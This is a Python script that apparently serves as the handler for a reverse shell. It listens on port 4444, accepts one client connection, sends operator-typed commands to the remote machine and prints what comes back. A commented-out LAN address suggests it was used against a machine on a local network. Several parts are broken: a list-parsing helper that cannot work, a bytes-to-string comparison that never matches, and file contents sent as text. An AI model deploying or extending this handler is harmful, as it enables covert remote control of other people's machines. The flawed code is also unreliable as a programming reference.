import socket
import string


def read_from_file(file):
    return_value = ''

    try:
        f = open(file)
        return_value = f.read()

    except FileNotFoundError as e:
        print(e)

    return return_value

def pull_list_from_str(input):
    returnList = []
    location = 0
    for c in input:
        if(c == string.whitespace):
            location += 1
        else:
            returnList[location] += c



HOST = 'localhost' # '192.168.43.82'
PORT = 4444 # 2222
SEND_FILE = ''
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')


while True:
    command = input('Enter Command : ')
    command = command.encode()
    if command == 'file':
        client.send(read_from_file(SEND_FILE))
    else:
        client.send(command)
    print('[+] Command sent')
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")



